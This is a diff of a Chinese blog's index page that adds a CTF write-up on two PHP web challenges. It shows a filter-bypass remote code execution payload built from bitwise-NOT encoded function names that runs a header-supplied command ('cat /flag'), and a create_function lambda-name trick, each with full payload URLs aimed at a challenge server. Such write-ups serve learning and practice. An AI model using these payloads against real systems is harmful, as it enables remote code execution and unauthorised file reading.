@@ -187,7 +187,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -223,6 +223,124 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/12/18/guojingming%E5%92%8Ceasyphp20201216/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/avatar.jpg">
+      <meta itemprop="name" content="左">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="左">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/18/guojingming%E5%92%8Ceasyphp20201216/" class="post-title-link" itemprop="url">guojingming和easyphp20201216</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-12-18 00:00:00 / 修改时间：23:57:48" itemprop="dateCreated datePublished" datetime="2020-12-18T00:00:00+08:00">2020-12-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="guojingming"><a href="#guojingming" class="headerlink" title="guojingming"></a>guojingming</h2><p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code) &gt; 70 or preg_match(&#39;&#x2F;[A-Za-z0-9]|\&#39;|&quot;|&#96;|\ |,|\.|-|\+|&#x3D;|\&#x2F;|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|&#x2F;is&#39;,$code))&#123;</span><br><span class="line">        die(&#39;Your Guojingming&#39;);</span><br><span class="line">    &#125;else if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\s\(\)]+?\((?R)?\)&#x2F;&#39;, &#39;&#39;, $code))&#123;</span><br><span class="line">        @eval($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>\：意思是过滤</p>
+<p>|：相当于“与”</p>
+<p>if语句：大小写字母、数字及许多字符都会被过滤。</p>
+<ul>
+<li>无参数RCE</li>
+</ul>
+<p>用getallheaders()函数来读取flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>
+
+<p>但是字母会被过滤，因此需要对这些字母进行取反</p>
+<ul>
+<li>取反</li>
+</ul>
+<p>比如system：</p>
+<p><img src="https://chen-lishan.gitee.io/tuc/%E9%83%AD%E6%95%AC%E6%98%8E/%E5%8F%96%E5%8F%8D.png"></p>
+<p>注：对echo取反需要加上单引号，而其他函数可加可不加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a&#x3D;(~&#39;system&#39;);</span><br><span class="line"></span><br><span class="line">echo urlencode($a);</span><br></pre></td></tr></table></figure>
+
+<p>以此类推</p>
+<ul>
+<li>动态构造函数</li>
+</ul>
+<p>php二维数组能够构造字符串，如：<code>[&#39;phpinfo&#39;][false] </code>可以构建一个字符串 “phpinfo”</p>
+<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/%E5%8A%A8%E6%80%81%E6%9E%84%E9%80%A0.png"></p>
+<p>最终输入网址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28004&#x2F;?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>
+
+<p>PS：~：取反符号</p>
+<p>不知为何，抓包后用Burp Suite无法获取flag，于是尝试用HackBar，在Add Header中，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>之前做过类似的题，输入的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p>而这道题用这个却做不了。flag可以理解为存在于一个文件中，而这道题的flag所在的文件名为flag。一般地，若没有提示，文件名为flag，或者flag.php，可以进行尝试。至于斜杆/：加不加没什么影响。</p>
+<p>刷新页面，可以得到flag：</p>
+<p><img src="https://chen-lishan.gitee.io/tuc/%E9%83%AD%E6%95%AC%E6%98%8E/flag.png"></p>
+<h2 id="easyphp20201216"><a href="#easyphp20201216" class="headerlink" title="easyphp20201216"></a>easyphp20201216</h2><p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a &#x3D; create_function(&quot;&quot;, &quot;echo(&#96;cat &#x2F;flag&#96;);&quot;);</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">     $_GET[&#39;a&#39;]();</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>解题思路：先将$a打印出来，然后就可以得到flag。</p>
+<p>这里可以看到<code>create_function()</code>这个函数漏洞，它create之后会自动生成函数<code>%00lambda_%d</code></p>
+<p>将题目代码复制到Sublime，并加入语句<code>echo $a;</code>运行之后，就可以得到<code>%00lambda_%d</code></p>
+<p>每刷新一次，$a的lambda_0后面的数都会加1</p>
+<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/easy2020.png"></p>
+<p>输入网址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28042&#x2F;?a&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/easy2020%20flag.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -847,7 +965,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/10/31/PHP%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">PHP反序列化漏洞</a>
+            <a href="/2020/10/31/PHP%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">PHP基础语法</a>
         </h2>
 
         <div class="post-meta-container">
@@ -865,7 +983,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-11-29 12:23:57" itemprop="dateModified" datetime="2020-11-29T12:23:57+08:00">2020-11-29</time>
+        <time title="修改时间：2020-12-15 17:29:23" itemprop="dateModified" datetime="2020-12-15T17:29:23+08:00">2020-12-15</time>
       </span>
 
   
